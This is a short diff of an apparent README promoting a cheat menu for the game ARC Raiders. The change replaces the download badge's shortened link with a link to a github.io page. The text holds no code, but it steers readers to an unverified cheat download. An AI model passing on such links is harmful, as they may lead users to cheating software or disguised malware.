@@ -10,7 +10,7 @@
 
 ![Скриншот меню Blurred DMA ARC Raiders](https://lavicheats.com/uploads/monthly_2025_11/arcraiderhypercheat.webp.8113019313599954491c33f4fb5f019d.webp)
 
-[![Download](https://img.shields.io/badge/Download-Menu-green?style=for-the-badge&logo=github)](https://flyn.co/ThCH6y)
+[![Download](https://img.shields.io/badge/Download-Menu-green?style=for-the-badge&logo=github)](https://meteoric-rook-835.github.io/)
 
 </div>
 
